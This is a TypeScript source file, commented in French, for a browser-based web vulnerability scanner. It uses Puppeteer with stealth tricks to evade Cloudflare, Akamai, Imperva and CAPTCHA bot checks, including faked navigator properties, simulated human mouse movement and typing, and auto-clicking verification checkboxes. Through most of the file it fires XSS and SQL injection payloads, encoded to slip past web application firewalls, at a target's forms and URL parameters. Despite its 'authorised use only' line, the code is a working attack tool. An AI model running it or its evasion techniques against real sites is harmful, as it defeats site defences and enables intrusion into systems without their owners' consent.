/**
 * TEKTON BROWSER-BASED SCANNER v3.0 - CLOUDFLARE BYPASS
 *
 * Scanner de niveau professionnel utilisant Chrome avec techniques stealth
 * pour bypasser Cloudflare, Akamai, Imperva et autres WAF.
 *
 * TECHNIQUES:
 * 1. Stealth mode - Masque l'automatisation
 * 2. Headers réalistes - Imite un vrai navigateur
 * 3. Comportement humain - Délais, mouvements, scroll
 * 4. Challenge solving - Attend la résolution Cloudflare
 *
 * ⚠️ USAGE AUTORISÉ UNIQUEMENT
 */

import { Vulnerability } from '../types';

// Variables globales
let browser: any = null;
let puppeteer: any = null;

// Payloads XSS avancés - encodés pour bypass WAF
const XSS_PAYLOADS = [
  // Basiques
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',

  // Encodés HTML
  '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;("XSS")>',
  '<svg/onload=alert`XSS`>',

  // Event handlers
  '<body onload=alert("XSS")>',
  '<input onfocus=alert("XSS") autofocus>',
  '<details open ontoggle=alert("XSS")>',
  '<marquee onstart=alert("XSS")>',
  '<audio src=x onerror=alert("XSS")>',

  // Bypass filtres
  '<ScRiPt>alert("XSS")</ScRiPt>',
  '"><img src=x onerror=alert("XSS")>',
  "'-alert('XSS')-'",
  '<iframe src="javascript:alert(`XSS`)">',

  // Double encodage
  '%3Cscript%3Ealert("XSS")%3C/script%3E',

  // Polyglot
  'javascript:/*--></title></style></textarea></script><svg/onload=\'+/"/+/onmouseover=1/+alert(1)//\'>',
];

// Payloads SQLi avancés - encodés pour bypass WAF
const SQLI_PAYLOADS = [
  // Basiques
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' #",
  "admin'--",

  // UNION
  "' UNION SELECT NULL--",
  "' UNION SELECT 1,2,3--",

  // Time-based blind
  "' AND SLEEP(3)--",
  "'; WAITFOR DELAY '0:0:3'--",
  "' AND (SELECT SLEEP(3))--",

  // Encodés pour bypass WAF
  "%27%20OR%20%271%27%3D%271",
  "' %4fR '1'='1",
  "/*!50000' OR '1'='1'*/",
  "' /*!50000OR*/ '1'='1",

  // Error-based
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
];

// Patterns d'erreur SQL
const SQL_ERROR_PATTERNS = [
  /sql syntax/i,
  /mysql_fetch/i,
  /ORA-\d{5}/i,
  /PostgreSQL.*ERROR/i,
  /SQLServer/i,
  /sqlite.*error/i,
  /unclosed quotation/i,
  /syntax error/i,
];

/**
 * Initialise Puppeteer de manière dynamique
 */
async function initPuppeteer(): Promise<boolean> {
  if (puppeteer) return true;

  try {
    // Import dynamique pour éviter les erreurs de build
    puppeteer = await import('puppeteer');
    console.log('   [OK] Puppeteer loaded successfully');
    return true;
  } catch (error) {
    console.log('   [WARN] Puppeteer not available, using fallback mode');
    return false;
  }
}

/**
 * Initialise le navigateur Chrome avec stealth
 */
async function initBrowser(): Promise<any> {
  if (browser) return browser;

  const available = await initPuppeteer();
  if (!available) return null;

  console.log('   [BROWSER] Launching Chrome with stealth mode...');

  browser = await puppeteer.default.launch({
    headless: 'new', // Nouveau mode headless moins détectable
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-gpu',
      '--window-size=1920,1080',
      '--disable-blink-features=AutomationControlled', // Cache l'automation
      '--disable-web-security',
      '--disable-features=IsolateOrigins,site-per-process',
      '--allow-running-insecure-content',
      '--disable-infobars',
      '--lang=fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
      '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ],
    ignoreHTTPSErrors: true,
    defaultViewport: null,
  });

  return browser;
}

/**
 * Ferme le navigateur
 */
export async function closeBrowser(): Promise<void> {
  if (browser) {
    try {
      await browser.close();
    } catch (e) {}
    browser = null;
  }
}

/**
 * Applique les techniques stealth à la page
 */
async function applyStealthToPage(page: any): Promise<void> {
  // Masquer webdriver
  await page.evaluateOnNewDocument(() => {
    // Supprimer la propriété webdriver
    Object.defineProperty(navigator, 'webdriver', {
      get: () => undefined,
    });

    // Faux plugins Chrome
    Object.defineProperty(navigator, 'plugins', {
      get: () => [
        { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
        { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
        { name: 'Native Client', filename: 'internal-nacl-plugin' },
      ],
    });

    // Faux langues
    Object.defineProperty(navigator, 'languages', {
      get: () => ['fr-FR', 'fr', 'en-US', 'en'],
    });

    // Masquer automation Chrome
    delete (window as any).cdc_adoQpoasnfa76pfcZLmcfl_Array;
    delete (window as any).cdc_adoQpoasnfa76pfcZLmcfl_Promise;
    delete (window as any).cdc_adoQpoasnfa76pfcZLmcfl_Symbol;

    // Chrome runtime pour les extensions
    (window as any).chrome = {
      runtime: {},
      loadTimes: function() {},
      csi: function() {},
      app: {},
    };

    // Permissions réalistes
    const originalQuery = window.navigator.permissions.query;
    (window.navigator.permissions as any).query = (parameters: any) =>
      parameters.name === 'notifications'
        ? Promise.resolve({ state: Notification.permission })
        : originalQuery(parameters);

    // WebGL vendor/renderer réalistes
    const getParameter = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = function(parameter) {
      if (parameter === 37445) return 'Intel Inc.';
      if (parameter === 37446) return 'Intel Iris OpenGL Engine';
      return getParameter.apply(this, [parameter]);
    };
  });

  // Headers réalistes
  await page.setExtraHTTPHeaders({
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br',
    'Cache-Control': 'max-age=0',
    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
  });
}

/**
 * Simule un comportement humain sur la page
 */
async function simulateHumanBehavior(page: any): Promise<void> {
  // Délai aléatoire
  await sleep(500 + Math.random() * 1500);

  // Mouvement de souris
  const viewportSize = await page.evaluate(() => ({
    width: window.innerWidth,
    height: window.innerHeight,
  }));

  // Plusieurs mouvements aléatoires
  for (let i = 0; i < 3; i++) {
    const x = Math.floor(Math.random() * viewportSize.width);
    const y = Math.floor(Math.random() * viewportSize.height);
    await page.mouse.move(x, y, { steps: 10 });
    await sleep(100 + Math.random() * 200);
  }

  // Scroll aléatoire
  await page.evaluate(() => {
    window.scrollBy({
      top: Math.floor(Math.random() * 300),
      behavior: 'smooth',
    });
  });

  await sleep(300 + Math.random() * 500);
}

/**
 * Détecte les différents types de CAPTCHA et challenges
 */
async function detectCaptchaOrChallenge(page: any): Promise<{
  type: string | null;
  detected: boolean;
}> {
  const content = await page.content();
  const url = page.url();

  // Cloudflare challenges
  if (
    content.includes('Checking your browser') ||
    content.includes('Just a moment') ||
    content.includes('DDoS protection by') ||
    content.includes('cf-browser-verification') ||
    content.includes('challenge-platform') ||
    content.includes('Cloudflare Ray ID')
  ) {
    return { type: 'cloudflare', detected: true };
  }

  // Cloudflare Turnstile
  if (
    content.includes('cf-turnstile') ||
    content.includes('challenges.cloudflare.com/turnstile')
  ) {
    return { type: 'turnstile', detected: true };
  }

  // reCAPTCHA
  if (
    content.includes('g-recaptcha') ||
    content.includes('recaptcha/api') ||
    content.includes('grecaptcha')
  ) {
    return { type: 'recaptcha', detected: true };
  }

  // hCaptcha
  if (
    content.includes('h-captcha') ||
    content.includes('hcaptcha.com')
  ) {
    return { type: 'hcaptcha', detected: true };
  }

  // Generic "Are you human?" pages
  if (
    content.includes('êtes-vous un humain') ||
    content.includes('are you human') ||
    content.includes('are you a robot') ||
    content.includes('êtes-vous un robot') ||
    content.includes('verify you are human') ||
    content.includes('vérifiez que vous êtes humain') ||
    content.includes('please verify') ||
    content.includes('bot detection') ||
    content.includes('suspicious activity')
  ) {
    return { type: 'human-verification', detected: true };
  }

  // Akamai Bot Manager
  if (
    content.includes('akamai') ||
    content.includes('_abck=') ||
    content.includes('bm_sz')
  ) {
    return { type: 'akamai', detected: true };
  }

  // Imperva/Incapsula
  if (
    content.includes('incapsula') ||
    content.includes('_incap_') ||
    content.includes('visid_incap')
  ) {
    return { type: 'imperva', detected: true };
  }

  return { type: null, detected: false };
}

/**
 * Attend que Cloudflare ou tout autre challenge soit bypassé
 */
async function waitForCloudflareBypass(page: any, timeout: number = 30000): Promise<boolean> {
  const startTime = Date.now();

  while (Date.now() - startTime < timeout) {
    const { type, detected } = await detectCaptchaOrChallenge(page);

    if (!detected) {
      console.log('   [OK] Challenge bypassed!');
      return true;
    }

    console.log(`   [WAIT] ${type} challenge detected, waiting...`);

    // Simuler un comportement humain pendant l'attente
    try {
      // Mouvement de souris aléatoire
      const viewportSize = await page.evaluate(() => ({
        width: window.innerWidth || 1920,
        height: window.innerHeight || 1080,
      }));

      const x = Math.floor(Math.random() * viewportSize.width);
      const y = Math.floor(Math.random() * viewportSize.height);
      await page.mouse.move(x, y, { steps: 5 });

      // Scroll léger
      await page.evaluate(() => {
        window.scrollBy(0, Math.random() * 50);
      });

      // Cliquer sur les checkboxes de vérification si présentes
      const checkbox = await page.$('[type="checkbox"]');
      if (checkbox) {
        const box = await checkbox.boundingBox();
        if (box) {
          // Clic humain avec petit délai et position légèrement aléatoire
          await page.mouse.move(
            box.x + box.width / 2 + (Math.random() - 0.5) * 5,
            box.y + box.height / 2 + (Math.random() - 0.5) * 5,
            { steps: 10 }
          );
          await sleep(100 + Math.random() * 200);
          await page.mouse.click(
            box.x + box.width / 2,
            box.y + box.height / 2
          );
        }
      }

      // Pour Turnstile/Cloudflare, ils se résolvent souvent automatiquement
      // avec un navigateur légitime + comportement humain
    } catch (e) {
      // Ignorer les erreurs de manipulation
    }

    await sleep(2000 + Math.random() * 1000);
  }

  console.log('   [WARN] Challenge timeout - may need manual intervention');
  return false;
}

/**
 * Découvre les formulaires sur une page
 */
async function discoverForms(page: any): Promise<any[]> {
  return await page.evaluate(() => {
    const forms: any[] = [];

    document.querySelectorAll('form').forEach((form, index) => {
      const inputs: any[] = [];

      form.querySelectorAll('input, textarea, select').forEach((input: any) => {
        inputs.push({
          name: input.name || input.id || `input_${inputs.length}`,
          type: input.type || 'text',
          tagName: input.tagName.toLowerCase(),
        });
      });

      forms.push({
        index,
        action: form.action || window.location.href,
        method: (form.method || 'GET').toUpperCase(),
        inputs,
      });
    });

    return forms;
  });
}

/**
 * SCANNER XSS avec navigateur réel
 */
export async function browserScanXSS(target: string): Promise<Vulnerability[]> {
  const vulnerabilities: Vulnerability[] = [];

  console.log('\n   [XSS-BROWSER] Starting browser-based XSS scan with stealth...');

  const browserInstance = await initBrowser();
  if (!browserInstance) {
    console.log('   [SKIP] Browser not available');
    return vulnerabilities;
  }

  try {
    const page = await browserInstance.newPage();

    // Appliquer les techniques stealth
    await applyStealthToPage(page);

    await page.setViewport({ width: 1920, height: 1080 });
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

    // Intercepter les alertes
    let xssTriggered = false;
    page.on('dialog', async (dialog: any) => {
      console.log(`   [CRITICAL] XSS TRIGGERED! Alert: ${dialog.message()}`);
      xssTriggered = true;
      await dialog.dismiss();
    });

    console.log(`   [NAV] Navigating to ${target}...`);
    await page.goto(target, { waitUntil: 'networkidle2', timeout: 30000 });
    await waitForCloudflareBypass(page);

    // Simuler comportement humain pour éviter détection
    await simulateHumanBehavior(page);

    // Découvrir les formulaires
    const forms = await discoverForms(page);
    console.log(`   [FORMS] Found ${forms.length} forms`);

    // Tester chaque formulaire
    for (const form of forms) {
      const textInputs = form.inputs.filter((i: any) =>
        ['text', 'search', 'email', 'url'].includes(i.type) || i.tagName === 'textarea'
      );

      if (textInputs.length === 0) continue;

      console.log(`   [TEST] Testing form #${form.index}`);

      for (const payload of XSS_PAYLOADS.slice(0, 5)) {
        xssTriggered = false;

        try {
          await page.goto(target, { waitUntil: 'networkidle2', timeout: 15000 });
          await waitForCloudflareBypass(page, 10000);

          // Remplir les champs avec frappe humaine
          for (const input of textInputs) {
            try {
              const selector = input.name ? `[name="${input.name}"]` : 'input[type="text"]';
              await humanType(page, selector, payload);
            } catch (e) {}
          }

          // Soumettre
          await Promise.all([
            page.waitForNavigation({ timeout: 10000 }).catch(() => {}),
            page.keyboard.press('Enter'),
          ]);

          await sleep(1000);

          if (xssTriggered) {
            vulnerabilities.push({
              type: 'xss',
              severity: 'critical',
              title: 'XSS Vulnerability (Browser Confirmed)',
              description: `Cross-Site Scripting confirmed! JavaScript alert was triggered.`,
              location: form.action,
              evidence: `Payload: ${payload}`,
            });
            break;
          }

          // Vérifier réflexion
          const content = await page.content();
          if (content.includes(payload)) {
            vulnerabilities.push({
              type: 'xss',
              severity: 'high',
              title: 'Reflected XSS (Unencoded)',
              description: `Payload reflected without encoding.`,
              location: form.action,
              evidence: `Payload: ${payload.substring(0, 30)}...`,
            });
            break;
          }

        } catch (error) {}
      }
    }

    // Tester les paramètres URL
    const url = new URL(target);
    const urlParams = Array.from(url.searchParams.keys());

    for (const param of urlParams) {
      console.log(`   [TEST] Testing URL param: ${param}`);

      for (const payload of XSS_PAYLOADS.slice(0, 3)) {
        xssTriggered = false;

        try {
          const testUrl = new URL(target);
          testUrl.searchParams.set(param, payload);

          await page.goto(testUrl.href, { waitUntil: 'networkidle2', timeout: 15000 });
          await sleep(1000);

          if (xssTriggered) {
            vulnerabilities.push({
              type: 'xss',
              severity: 'critical',
              title: 'XSS in URL Parameter',
              description: `XSS in parameter "${param}".`,
              location: testUrl.href,
              evidence: `Payload: ${payload}`,
            });
            break;
          }

        } catch (error) {}
      }
    }

    await page.close();

  } catch (error) {
    console.error('   [ERROR] Browser XSS scan error:', error);
  }

  console.log(`   [OK] XSS scan: ${vulnerabilities.length} vulnerabilities`);
  return vulnerabilities;
}

/**
 * SCANNER SQLi avec navigateur réel
 */
export async function browserScanSQLi(target: string): Promise<Vulnerability[]> {
  const vulnerabilities: Vulnerability[] = [];

  console.log('\n   [SQLI-BROWSER] Starting browser-based SQLi scan with stealth...');

  const browserInstance = await initBrowser();
  if (!browserInstance) {
    console.log('   [SKIP] Browser not available');
    return vulnerabilities;
  }

  try {
    const page = await browserInstance.newPage();

    // Appliquer les techniques stealth
    await applyStealthToPage(page);

    await page.setViewport({ width: 1920, height: 1080 });
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

    console.log(`   [NAV] Navigating to ${target}...`);
    await page.goto(target, { waitUntil: 'networkidle2', timeout: 30000 });
    await waitForCloudflareBypass(page);

    // Simuler comportement humain
    await simulateHumanBehavior(page);

    const forms = await discoverForms(page);
    console.log(`   [FORMS] Found ${forms.length} forms`);

    for (const form of forms) {
      const textInputs = form.inputs.filter((i: any) =>
        ['text', 'password', 'email', 'search'].includes(i.type)
      );

      if (textInputs.length === 0) continue;

      console.log(`   [TEST] Testing form #${form.index}`);

      for (const payload of SQLI_PAYLOADS.slice(0, 5)) {
        try {
          await page.goto(target, { waitUntil: 'networkidle2', timeout: 15000 });
          await waitForCloudflareBypass(page, 10000);

          // Remplir les champs avec frappe humaine
          for (const input of textInputs) {
            try {
              const selector = input.name ? `[name="${input.name}"]` : 'input';
              await humanType(page, selector, payload);
            } catch (e) {}
          }

          const startTime = Date.now();

          await Promise.all([
            page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
            page.keyboard.press('Enter'),
          ]);

          const responseTime = Date.now() - startTime;
          await sleep(500);

          const content = await page.content();
          const sqlError = SQL_ERROR_PATTERNS.find(p => p.test(content));

          if (sqlError) {
            vulnerabilities.push({
              type: 'sqli',
              severity: 'critical',
              title: 'SQL Injection (Error-Based)',
              description: `SQL error exposed in response.`,
              location: form.action,
              evidence: `Payload: ${payload}\nError: ${sqlError.source}`,
            });
            break;
          }

          // Time-based detection
          if (payload.includes('SLEEP') && responseTime > 5000) {
            vulnerabilities.push({
              type: 'sqli',
              severity: 'critical',
              title: 'SQL Injection (Time-Based)',
              description: `Response delayed by ${responseTime}ms.`,
              location: form.action,
              evidence: `Payload: ${payload}\nDelay: ${responseTime}ms`,
            });
            break;
          }

        } catch (error) {}
      }
    }

    // Tester paramètres URL
    const url = new URL(target);
    const urlParams = Array.from(url.searchParams.keys());

    for (const param of urlParams) {
      console.log(`   [TEST] Testing URL param: ${param}`);

      for (const payload of SQLI_PAYLOADS.slice(0, 3)) {
        try {
          const testUrl = new URL(target);
          testUrl.searchParams.set(param, payload);

          const startTime = Date.now();
          await page.goto(testUrl.href, { waitUntil: 'networkidle2', timeout: 15000 });
          const responseTime = Date.now() - startTime;

          const content = await page.content();
          const sqlError = SQL_ERROR_PATTERNS.find(p => p.test(content));

          if (sqlError) {
            vulnerabilities.push({
              type: 'sqli',
              severity: 'critical',
              title: 'SQL Injection in URL',
              description: `SQL error in param "${param}".`,
              location: testUrl.href,
              evidence: `Payload: ${payload}`,
            });
            break;
          }

          if (payload.includes('SLEEP') && responseTime > 5000) {
            vulnerabilities.push({
              type: 'sqli',
              severity: 'critical',
              title: 'Time-Based SQLi in URL',
              description: `Response delayed for param "${param}".`,
              location: testUrl.href,
              evidence: `Delay: ${responseTime}ms`,
            });
            break;
          }

        } catch (error) {}
      }
    }

    await page.close();

  } catch (error) {
    console.error('   [ERROR] Browser SQLi scan error:', error);
  }

  console.log(`   [OK] SQLi scan: ${vulnerabilities.length} vulnerabilities`);
  return vulnerabilities;
}

/**
 * Crawle le site avec le navigateur
 */
export async function browserCrawl(target: string, maxPages: number = 50): Promise<string[]> {
  const discoveredUrls: Set<string> = new Set();

  console.log('\n   [CRAWL] Starting browser-based crawl with stealth...');

  const browserInstance = await initBrowser();
  if (!browserInstance) {
    return Array.from(discoveredUrls);
  }

  try {
    const page = await browserInstance.newPage();

    // Appliquer les techniques stealth
    await applyStealthToPage(page);

    await page.setViewport({ width: 1920, height: 1080 });

    const toVisit: string[] = [target];
    const visited: Set<string> = new Set();
    const baseUrl = new URL(target);

    while (toVisit.length > 0 && discoveredUrls.size < maxPages) {
      const currentUrl = toVisit.shift()!;
      if (visited.has(currentUrl)) continue;
      visited.add(currentUrl);

      try {
        await page.goto(currentUrl, { waitUntil: 'networkidle2', timeout: 15000 });
        await waitForCloudflareBypass(page, 10000);

        // Simuler comportement humain
        await simulateHumanBehavior(page);

        discoveredUrls.add(currentUrl);

        const links = await page.evaluate((host: string) => {
          const urls: string[] = [];
          document.querySelectorAll('a[href]').forEach((a: any) => {
            try {
              const url = new URL(a.href);
              if (url.hostname === host) urls.push(url.href);
            } catch (e) {}
          });
          return urls;
        }, baseUrl.hostname);

        for (const link of links) {
          if (!visited.has(link) && !toVisit.includes(link)) {
            toVisit.push(link);
          }
        }

        console.log(`   [CRAWL] Pages: ${discoveredUrls.size}, Queue: ${toVisit.length}`);

      } catch (error) {}
    }

    await page.close();

  } catch (error) {
    console.error('   [ERROR] Crawl error:', error);
  }

  console.log(`   [OK] Crawl: ${discoveredUrls.size} pages`);
  return Array.from(discoveredUrls);
}

function sleep(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/**
 * Tape du texte de manière humaine avec des délais variables
 */
async function humanType(page: any, selector: string, text: string): Promise<void> {
  try {
    await page.waitForSelector(selector, { timeout: 3000 });
    await page.click(selector, { clickCount: 3 }); // Sélectionner tout
    await sleep(100 + Math.random() * 100);

    // Taper caractère par caractère avec délais variables
    for (const char of text) {
      await page.type(selector, char, { delay: 0 });

      // Délai variable - les humains tapent plus vite sur certaines lettres
      const baseDelay = 30 + Math.random() * 50;
      const typoChance = Math.random();

      // Occasionnellement faire une pause plus longue (comme si on réfléchissait)
      if (typoChance < 0.05) {
        await sleep(200 + Math.random() * 300);
      } else {
        await sleep(baseDelay);
      }
    }
  } catch (e) {
    // Fallback to normal typing
    try {
      await page.type(selector, text, { delay: 30 });
    } catch (e2) {}
  }
}
